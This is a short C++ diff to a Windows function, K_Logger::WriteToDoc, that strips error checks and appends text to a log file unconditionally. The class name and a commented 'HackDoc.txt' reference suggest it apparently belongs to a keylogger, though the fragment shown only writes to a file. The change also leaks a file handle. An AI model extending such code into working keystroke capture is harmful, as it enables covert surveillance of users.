@@ -27,18 +27,14 @@ void K_Logger::WriteToDoc(LPCSTR text)
 	//but the text is not written to the file. 
 	//The text is written after you compile the program again.
 
-	
-	if (!CreateDirectory(fileName, NULL))
-	{
-		if (CreateFile(fileNameTo, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL))
-		{
-			//Sleep(50);
+	CreateDirectory(fileName, NULL);
+	CreateFile(fileNameTo, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
 
-			doc_to.open(fileNameTo, std::fstream::app);
-			doc_to << text;
-			doc_to.close();
-		}
-	}
+	//Sleep(50);
+
+	doc_to.open(fileNameTo, std::fstream::app);
+	doc_to << text;
+	doc_to.close();
 	/***********************************************************************************************************/
 
 	/*doc_to.open("HackDoc.txt", std::fstream::app);
